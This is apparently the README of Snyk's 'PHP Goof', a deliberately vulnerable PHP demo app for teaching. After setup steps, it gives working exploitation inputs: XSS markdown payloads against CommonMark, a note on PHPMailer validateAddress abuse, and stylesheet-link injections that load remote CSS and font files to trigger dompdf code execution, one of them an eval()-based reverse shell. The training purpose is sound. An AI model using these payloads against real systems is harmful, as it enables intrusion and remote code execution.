# PHP Goof - Snyk's vulnerable demo php app

A vulnerable PHP demo todo application that is for demonstration and education purposes only, i take no responsibility for this being used with malicious intent nor should this be used for malicious intent (or be run in any product environment).
 
![PHP Goof](/images/screenshot.png)
  
## Requisites & Running 

- PHP 7.4+
- Mysql or MariaDB 
- Composer 2

Run composer install from the project root directory

Create mysql or mariaDB database and update the db.php file, with database details. 

Import sql/database.sql file into the newly created database or run the following table create.

```
CREATE TABLE `task` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=76 DEFAULT CHARSET=utf8mb3;
```

Finally, Using the PHP built in server run the code from the root app directory

```
php -S localhost:8000
```

## Exploiting the vulnerabilities

### Commonmark XSS Vulnerability

[SNYK-PHP-LEAGUECOMMONMARK-174004](https://security.snyk.io/vuln/SNYK-PHP-LEAGUECOMMONMARK-174004)

```
* Markdown link
This is **markdown**

* Markdown link
[Snyk](https://snyk.io/)

* Failed XSS
[Gotcha](javascript:alert(1))

* Failed XSS despite URL encoding
[Gotcha](javascript&#58;alert(1&#41;)

* Successfull XSS using vuln and browser interpretation 
[Gotcha](javascript&amp;colon;alert%28&#039;Gotcha&#039;%29)
```

### PHPMailer 

[SNYK-PHP-PHPMAILERPHPMAILER-1311001](https://security.snyk.io/vuln/SNYK-PHP-PHPMAILERPHPMAILER-1311001)

Uses the `validateAddress()` exploit from PHPMailer 6.4.1 to execute the global `PHP()` function by default. If no argument is passed into the `validateAddress()` function, which isnt in this demo, PHPMailer sets "PHP" as the default value and runs it if its available in the scope. 

To run click the email icon next to a line entry to send an email reminder. 

Note: No emails will actually send or are being stored, only validating the email address entered into the input using the PHPMailer library. 


### dompdf remote code execution 

[SNYK-PHP-DOMPDFDOMPDF-2428942](https://security.snyk.io/vuln/SNYK-PHP-DOMPDFDOMPDF-2428942)

[Read more about this Vulnerability](https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/)

This vulnerability is using dompdf library version 1.2.0 and allows for remote code execution on the target application. In this app there is a custom font called gotcha-normal.otf which has `<?php phpinfo(); ?>` loaded into the copyright font meta. 

The font file is then referenced as a `font-family` in the CSS file `gotcha.css` which is then injected into the dompdf html output via a stylesheet link. 

Dompdf loads the style sheet and saves the custom font type to the dompdf font cache (and as part of the framework). This can then be remotely executed. 

*** Note: in the CSS font-family, the font name needs to match the actual font name or this will not work. 

To use this in this app, load the below code into a todo item and click pdf on its line entry, chicken and egg note that you will need to refresh the PDF with the file examples below so that the link generates into the pdf to click. 

```
<link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/gotcha.css'>
```
Additional, added an example that uses a reverse shell by using a php `eval()` in a font file leveraging the RCE exploit. This works the same as above but using the below CSS. To use it simply load any get variable into the url when the gotcha link is created in the pdf, example `...?test=phpinfo();`. Regular $_GET references didnt work but `reset()` did which will pick up the first in the $ array and run it in `eval()`.

Note this uses a different font file and family in the exploit folder.

```
<link rel=stylesheet href='https://raw.githubusercontent.com/snyk-labs/php-goof/main/exploits/rshell.css'>
```
